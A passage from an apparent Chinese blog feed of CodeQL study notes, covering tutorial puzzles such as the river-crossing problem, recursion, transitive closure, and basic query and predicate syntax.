class="pattern-match">&#125;</span></span><br></pre></td></tr></table></figure><p>如果你只关心某个特定的soruce，那么src参数就是多余的了，可以内部exists替代</p><p>当然，你也可以根据n添加其他感兴趣的列，但一般建议至少包括封闭的可调用程序和到源头的距离，因为它们可以成为有用的列，以便对结果进行排序。</p><p>如果你看到大量的部分流动结果，你可以通过几种方式来关注它们。</p><ol><li><p>如果数据流按照预期的路径走了很远的距离，这可能导致大量无用的flow被包括在探索半径内。</p><p>为了精简它们，你可以用沿着路径出现的合适node替换source定义，并从该node重新开始局部数据流探索。</p></li><li><p>可以创造性地使用barrier和sanitizer来剪枝。这也减少了调试时需要探索的partial flow的数量。</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;春风不相识，何事入罗帏。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;CodeQL for Java。&lt;a href=&quot;https://codeql.github.com/docs/codeql-language-guides/codeql-for-java/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官方文档对应章节&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CodeQL" scheme="https://fynch3r.github.io/categories/CodeQL/"/>
    
    
      <category term="CodeQL" scheme="https://fynch3r.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL学习笔记(三)</title>
    <link href="https://fynch3r.github.io/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89/"/>
    <id>https://fynch3r.github.io/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89/</id>
    <published>2021-10-26T07:59:06.000Z</published>
    <updated>2022-01-05T11:34:36.297Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>襄阳好风日，留醉与山翁。</p></blockquote><p>和CodeQL官方示例学习QL写法。</p><a id="more"></a><h2 id="QL规范"><a href="#QL规范" class="headerlink" title="QL规范"></a>QL规范</h2><p>总结从例子中学到的语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;存在 exists 临时变量</span><br><span class="line">exists(string c | t.getHairColor() &#x3D; c)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 聚合 count, max, min, avg(average)，sum</span><br><span class="line">&lt;aggregate&gt;(&lt;variable declarations&gt; | &lt;logical formula&gt; | &lt;expression&gt;)</span><br></pre></td></tr></table></figure><h2 id="谁是小偷？"><a href="#谁是小偷？" class="headerlink" title="谁是小偷？"></a>谁是小偷？</h2><p>地址：<a href="https://codeql.github.com/docs/writing-codeql-queries/find-the-thief/" target="_blank" rel="noopener">find-the-theif</a>，主要考察聚合搜索。</p><p>v1.0版本：</p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89/image-20211026162237269.png" alt="image-20211026162237269" style="zoom:50%;"><p>高级用法，聚合搜索：</p><p>小偷是村子里年龄最大的人：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from Person t</span><br><span class="line">where t.getAge() &#x3D; max(int i | exists(Person p | p.getAge()) | i)</span><br><span class="line">select t</span><br></pre></td></tr></table></figure><p>有序聚合，有序选出最老的人：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">max</span>(Person p || p <span class="keyword">order</span> <span class="keyword">by</span> p.getAge())</span><br></pre></td></tr></table></figure><p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89/image-20211026165232185.png" alt="image-20211026165232185"></p><p>最终版，找到小偷是Hester</p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89/image-20211026185415157.png" alt="image-20211026185415157" style="zoom:50%;"><h2 id="找到纵火犯"><a href="#找到纵火犯" class="headerlink" title="找到纵火犯"></a>找到纵火犯</h2><p>地址：<a href="https://codeql.github.com/docs/writing-codeql-queries/catch-the-fire-starter/" target="_blank" rel="noopener">catch-the-fire-starter</a></p><p>定义新谓词isSouthern：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import tutorial</span><br><span class="line">&#x2F;&#x2F;特征谓词</span><br><span class="line">predicate isSouthern(Person p) &#123;</span><br><span class="line">    p.getLocation() &#x3D; &quot;south&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 找到所有的南方人</span><br><span class="line">from Person p</span><br><span class="line">where isSouthern(p)</span><br><span class="line">select p</span><br></pre></td></tr></table></figure><p>或者可以定义一个类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Southerner extends Person &#123;</span><br><span class="line">    Southerner()&#123;</span><br><span class="line">        isSouthern(this)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;找到全部</span><br><span class="line">from Southerner sp</span><br><span class="line">select sp</span><br></pre></td></tr></table></figure><p>重载谓词：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Child extends Person &#123;</span><br><span class="line">    Child()&#123;</span><br><span class="line">        this.getAge()&lt;10</span><br><span class="line">    &#125;</span><br><span class="line">    override predicate isAllowedIn(string region)&#123;</span><br><span class="line">        this.getLocation() &#x3D; region</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89/image-20211026193151828.png" alt="image-20211026193151828" style="zoom:50%;"><p>找到了纵火犯</p><p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89/image-20211026193936560.png" alt="image-20211026193936560"></p><h2 id="加冕合法继承人"><a href="#加冕合法继承人" class="headerlink" title="加冕合法继承人"></a>加冕合法继承人</h2><p>地址：<a href="https://codeql.github.com/docs/writing-codeql-queries/crown-the-rightful-heir/" target="_blank" rel="noopener">crown-the-rightful-heir</a></p><p>覆盖成员谓词：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Child extends Person &#123;</span><br><span class="line"> </span><br><span class="line">    &#x2F;* the characteristic predicate *&#x2F;</span><br><span class="line">    Child() &#123; this.getAge() &lt; 10 &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;* a member predicate *&#x2F;</span><br><span class="line">    override predicate isAllowedIn(string region) &#123;</span><br><span class="line">        region &#x3D; this.getLocation()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>谓词isAllowedIn(string region)应用于表示村民的变量p上的时候，如果变量p的类型不是Child，则使用该谓词原来的定义；但是如果变量p的类型为Child，也就是说这个变量表示的村民是一个孩子，那么，该谓词将会使用Child类中的新定义，从而覆盖原来的代码。</p><p>QL的递归用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F; 返回p的孩子 result是默认的返回值</span><br><span class="line">Person childOf(Person p) &#123; parentOf(result) &#x3D; p &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;返回p的所有祖先 存在迭代关系</span><br><span class="line">Person ancestorOf(Person p)&#123;</span><br><span class="line">    result &#x3D; parentOf(p) or</span><br><span class="line">    result &#x3D; parentOf(childOf(p))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>transitive closure</strong></p><p>传递闭包 QL里两个特殊的符号 <code>+</code> ,<code>*</code></p><blockquote><ul><li><code>parentOf+(p)</code> applies the <code>parentOf()</code> predicate to <code>p</code> one or more times. This is equivalent to <code>ancestorOf(p)</code>.</li><li><code>parentOf*(p)</code> applies the <code>parentOf()</code> predicate to <code>p</code> zero or more times, so it returns an ancestor of <code>p</code> or <code>p</code> itself.</li></ul></blockquote><p>+递归一次或者更多，和ancestorOf效果一样</p><p>*递归0次或者更多，返回p的一层祖先或者p自身</p><p>返回p的所有亲戚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Person relativeOf(Person p)&#123;</span><br><span class="line">    parentOf*(result) &#x3D; parentOf*(p)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89/image-20211026204546706.png" alt="image-20211026204546706" style="zoom:50%;"><p>QL递归举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 找到0～100 之间所有的整数</span><br><span class="line">int findNumber()&#123;</span><br><span class="line">    result &#x3D; 0</span><br><span class="line">    or </span><br><span class="line">    result &lt;&#x3D;100 and result &#x3D; findNumber()+1</span><br><span class="line">&#125;</span><br><span class="line">select findNumber()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 找到0～100之间的所有偶数</span><br><span class="line">int getAnEven() &#123;</span><br><span class="line">  result &#x3D; 0</span><br><span class="line">  or</span><br><span class="line">  result &lt;&#x3D; 100 and result &#x3D; getAnOdd() + 1</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int getAnOdd() &#123;</span><br><span class="line">  result &#x3D; getAnEven() + 1</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">select getAnEven()</span><br></pre></td></tr></table></figure><h2 id="过河"><a href="#过河" class="headerlink" title="过河"></a>过河</h2><p>地址：<a href="https://codeql.github.com/docs/writing-codeql-queries/cross-the-river/" target="_blank" rel="noopener">cross-the-river</a></p><p>很有趣的一道题，推荐去看原文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">import tutorial</span><br><span class="line"></span><br><span class="line">class Cargo extends string &#123;</span><br><span class="line">    Cargo() &#123;</span><br><span class="line">      this &#x3D; &quot;Nothing&quot; or</span><br><span class="line">      this &#x3D; &quot;Goat&quot; or</span><br><span class="line">      this &#x3D; &quot;Cabbage&quot; or</span><br><span class="line">      this &#x3D; &quot;Wolf&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  &#x2F;** One of two shores. *&#x2F;</span><br><span class="line">  class Shore extends string &#123;</span><br><span class="line">    Shore() &#123;</span><br><span class="line">      this &#x3D; &quot;Left&quot; or</span><br><span class="line">      this &#x3D; &quot;Right&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    &#x2F;** Returns the other shore. *&#x2F;</span><br><span class="line">    Shore other() &#123;</span><br><span class="line">      this &#x3D; &quot;Left&quot; and result &#x3D; &quot;Right&quot;</span><br><span class="line">      or</span><br><span class="line">      this &#x3D; &quot;Right&quot; and result &#x3D; &quot;Left&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  &#x2F;** Renders the state as a string. *&#x2F;</span><br><span class="line">  string renderState(Shore manShore, Shore goatShore, Shore cabbageShore, Shore wolfShore) &#123;</span><br><span class="line">    result &#x3D; manShore + &quot;,&quot; + goatShore + &quot;,&quot; + cabbageShore + &quot;,&quot; + wolfShore</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  &#x2F;** A record of where everything is. *&#x2F;</span><br><span class="line">  class State extends string &#123;</span><br><span class="line">    Shore manShore;</span><br><span class="line">    Shore goatShore;</span><br><span class="line">    Shore cabbageShore;</span><br><span class="line">    Shore wolfShore;</span><br><span class="line">  </span><br><span class="line">    State() &#123; this &#x3D; renderState(manShore, goatShore, cabbageShore, wolfShore) &#125;</span><br><span class="line">  </span><br><span class="line">    &#x2F;** Returns the state that is reached after ferrying a particular cargo item. *&#x2F;</span><br><span class="line">    State ferry(Cargo cargo) &#123;</span><br><span class="line">      cargo &#x3D; &quot;Nothing&quot; and</span><br><span class="line">      result &#x3D; renderState(manShore.other(), goatShore, cabbageShore, wolfShore)</span><br><span class="line">      or</span><br><span class="line">      cargo &#x3D; &quot;Goat&quot; and</span><br><span class="line">      result &#x3D; renderState(manShore.other(), goatShore.other(), cabbageShore, wolfShore)</span><br><span class="line">      or</span><br><span class="line">      cargo &#x3D; &quot;Cabbage&quot; and</span><br><span class="line">      result &#x3D; renderState(manShore.other(), goatShore, cabbageShore.other(), wolfShore)</span><br><span class="line">      or</span><br><span class="line">      cargo &#x3D; &quot;Wolf&quot; and</span><br><span class="line">      result &#x3D; renderState(manShore.other(), goatShore, cabbageShore, wolfShore.other())</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    &#x2F;**</span><br><span class="line">     * Holds if the state is safe. This occurs when neither the goat nor the cabbage</span><br><span class="line">     * can get eaten.</span><br><span class="line">     *&#x2F;</span><br><span class="line">    predicate isSafe() &#123;</span><br><span class="line">      &#x2F;&#x2F; The goat can&#39;t eat the cabbage.</span><br><span class="line">      (goatShore !&#x3D; cabbageShore or goatShore &#x3D; manShore) and</span><br><span class="line">      &#x2F;&#x2F; The wolf can&#39;t eat the goat.</span><br><span class="line">      (wolfShore !&#x3D; goatShore or wolfShore &#x3D; manShore)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    &#x2F;** Returns the state that is reached after safely ferrying a cargo item. *&#x2F;</span><br><span class="line">    State safeFerry(Cargo cargo) &#123; result &#x3D; this.ferry(cargo) and result.isSafe() &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;** man&#39;s move *&#x2F;</span><br><span class="line">    string towards() &#123;</span><br><span class="line">      manShore &#x3D; &quot;Left&quot; and result &#x3D; &quot;to the left&quot;</span><br><span class="line">      or</span><br><span class="line">      manShore &#x3D; &quot;Right&quot; and result &#x3D; &quot;to the right&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    &#x2F;**</span><br><span class="line">     * Returns all states that are reachable via safe ferrying.</span><br><span class="line">     * &#96;path&#96; keeps track of how it is achieved.</span><br><span class="line">     * &#96;visitedStates&#96; keeps track of previously visited states and is used to avoid loops.</span><br><span class="line">     *&#x2F;</span><br><span class="line">    State reachesVia(string path, string visitedStates) &#123;</span><br><span class="line">      &#x2F;&#x2F; Reachable in 1 step by ferrying a specific cargo</span><br><span class="line">      exists(Cargo cargo |</span><br><span class="line">        result &#x3D; this.safeFerry(cargo) and</span><br><span class="line">        visitedStates &#x3D; result and</span><br><span class="line">        path &#x3D; &quot;First &quot; + cargo + &quot; is ferried &quot; + result.towards() + &quot;,&quot;</span><br><span class="line">      )</span><br><span class="line">      or</span><br><span class="line">      &#x2F;&#x2F; Reachable by first following pathSoFar and then ferrying cargo</span><br><span class="line">      exists(string pathSoFar, string visitedStatesSoFar, Cargo cargo |</span><br><span class="line">        result &#x3D; this.reachesVia(pathSoFar, visitedStatesSoFar).safeFerry(cargo) and</span><br><span class="line">        &#x2F;&#x2F; resulting state is not visited yet</span><br><span class="line">        not exists(int i | i &#x3D; visitedStatesSoFar.indexOf(result)) and </span><br><span class="line">        visitedStates &#x3D; visitedStatesSoFar + &quot;_&quot; + result and</span><br><span class="line">        path &#x3D; pathSoFar + &quot;\nthen &quot; + cargo + &quot; is ferried &quot; + result.towards() + &quot;,&quot;</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  &#x2F;** The initial state, where everything is on the left shore. *&#x2F;</span><br><span class="line">  class InitialState extends State &#123;</span><br><span class="line">    InitialState() &#123; this &#x3D; renderState(&quot;Left&quot;, &quot;Left&quot;, &quot;Left&quot;, &quot;Left&quot;) &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  &#x2F;** The goal state, where everything is on the right shore. *&#x2F;</span><br><span class="line">  class GoalState extends State &#123;</span><br><span class="line">    GoalState() &#123; this &#x3D; renderState(&quot;Right&quot;, &quot;Right&quot;, &quot;Right&quot;, &quot;Right&quot;) &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  from string path</span><br><span class="line">  where any(InitialState i).reachesVia(path, _) &#x3D; any(GoalState g)</span><br><span class="line">  select path + &quot;.&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89/image-20211026220931326.png" alt="image-20211026220931326"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;襄阳好风日，留醉与山翁。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;和CodeQL官方示例学习QL写法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CodeQL" scheme="https://fynch3r.github.io/categories/CodeQL/"/>
    
    
      <category term="CodeQL" scheme="https://fynch3r.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL学习笔记(二)</title>
    <link href="https://fynch3r.github.io/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/"/>
    <id>https://fynch3r.github.io/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/</id>
    <published>2021-10-22T11:59:19.000Z</published>
    <updated>2022-02-28T03:17:50.939Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>倚杖柴门外，临门听暮蝉。</p></blockquote><p>学习CodeQL查询语法。</p><a id="more"></a><h1 id="基本查询结构"><a href="#基本查询结构" class="headerlink" title="基本查询结构"></a>基本查询结构</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Query metadata</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import <span class="comment">/* ... CodeQL libraries or modules ... */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... Optional, define CodeQL classes and predicates ... */</span></span><br><span class="line"></span><br><span class="line">from <span class="comment">/* ... variable declarations ... */</span></span><br><span class="line">where <span class="comment">/* ... logical formula ... */</span></span><br><span class="line"><span class="keyword">select</span> <span class="comment">/* ... expressions ... */</span></span><br></pre></td></tr></table></figure><p>用户可以在查询过程中自定义谓词和类来自主分析。</p><p>一些专有名词：</p><ul><li><p>statement 语句 </p></li><li><p>predicate 谓词</p></li><li><p>clause 子句</p></li></ul><h2 id="import语句"><a href="#import语句" class="headerlink" title="import语句"></a>import语句</h2><p>定于需要导入到查询中的库和模块，以及源码对应的语言模块：</p><p>cpp,csharp,go,java,javascript,python</p><p>CodeQL为开发者提供了一些库，包含常用的谓词、类型和适用于各种分析的模块，比如控制流、数据流、污点追踪。</p><h1 id="三个clause字句"><a href="#三个clause字句" class="headerlink" title="三个clause字句"></a>三个clause字句</h1><h2 id="from"><a href="#from" class="headerlink" title="from"></a>from</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from &lt;type&gt; &lt;variable name&gt;,...</span><br></pre></td></tr></table></figure><p>声明在查询中需要使用的变量</p><h2 id="where"><a href="#where" class="headerlink" title="where"></a>where</h2><p>对from中声明对变量加以限制的逻辑条件。</p><h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><p>寻找那些from声明的、满足where条件的所有查询结果。</p><p>举个例子，到所有勾股值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from int x, int y, int z, int summary</span><br><span class="line">where</span><br><span class="line">  x in [1 .. 10] and</span><br><span class="line">  y in [1 .. 10] and</span><br><span class="line">  z in [1 .. 10] and</span><br><span class="line">  x * x + y * y &#x3D; z * z and</span><br><span class="line">  summary &#x3D; x + y + z</span><br><span class="line">select x, y, z, summary</span><br></pre></td></tr></table></figure><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/image-20211026152559442.png" alt="image-20211026152559442" style="zoom:50%;"><p>告警模板，包含两列：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select element, string</span><br></pre></td></tr></table></figure><ul><li>element：查询结果，查询标识的代码元素，定义危险点的位置。</li><li>string：为element显附加的报警消息，描述警报的原因。</li></ul><p>自定义类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class SmallInt extends int &#123;</span><br><span class="line">    SmallInt()&#123;</span><br><span class="line">        this in [1..10]</span><br><span class="line">    &#125;</span><br><span class="line">    int square()&#123;</span><br><span class="line">        result &#x3D; this * this</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from SmallInt x, SmallInt y, SmallInt z</span><br><span class="line">where x.square() + y.square() &#x3D; z.square()</span><br><span class="line">select x, y, z</span><br></pre></td></tr></table></figure><h1 id="QL语言参考"><a href="#QL语言参考" class="headerlink" title="QL语言参考"></a>QL语言参考</h1><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p>QL特点：</p><ul><li>Declarative 命令式 ：描述了结果必须满足的属性，而不是提供计算结果的过程。</li><li>Object-oriented 面向对象</li></ul><p>QL中的class实际上并不是像Java语言一样需要占用一段内存空间，QL中的类是限制已有数据的逻辑属性</p><h2 id="谓词-Predicate"><a href="#谓词-Predicate" class="headerlink" title="谓词 Predicate"></a>谓词 Predicate</h2><p>关键字predicate，QL中的“函数”，本质上帮助QL程序限制逻辑特性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">predicate isCountry(string country) &#123;</span><br><span class="line">  country &#x3D; &quot;Germany&quot;</span><br><span class="line">  or</span><br><span class="line">  country &#x3D; &quot;Belgium&quot;</span><br><span class="line">  or</span><br><span class="line">  country &#x3D; &quot;France&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate hasCapital(string country, string capital) &#123;</span><br><span class="line">  country &#x3D; &quot;Belgium&quot; and capital &#x3D; &quot;Brussels&quot;</span><br><span class="line">  or</span><br><span class="line">  country &#x3D; &quot;Germany&quot; and capital &#x3D; &quot;Berlin&quot;</span><br><span class="line">  or</span><br><span class="line">  country &#x3D; &quot;France&quot; and capital &#x3D; &quot;Paris&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>规范：</p><ul><li><p>谓词可以在任意地方定义，可以有返回值也可以没有，返回值默认变量为<code>result</code>。</p></li><li><p>谓词名称为小写字母开头，驼峰命名就是一个不错的选择。</p></li><li><p>参数列表逗号分割，每个参数类型+形参名称。</p></li><li><p>谓词体，逻辑公式。</p></li></ul><blockquote><p>抽象谓词和外部谓词是可以没有谓词体的。<code>声明；</code>即可</p></blockquote><h3 id="没有返回值的谓词"><a href="#没有返回值的谓词" class="headerlink" title="没有返回值的谓词"></a>没有返回值的谓词</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">predicate isSmall(int i)&#123;</span><br><span class="line">i in [1..9]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from int i</span><br><span class="line">where isSmall(i)</span><br><span class="line">select i</span><br></pre></td></tr></table></figure><p>如果i是int，并且在[1～9]之间，那么这个谓词成立。</p><h3 id="有返回值的谓词"><a href="#有返回值的谓词" class="headerlink" title="有返回值的谓词"></a>有返回值的谓词</h3><figure class="highlight plain"><table><tr><td 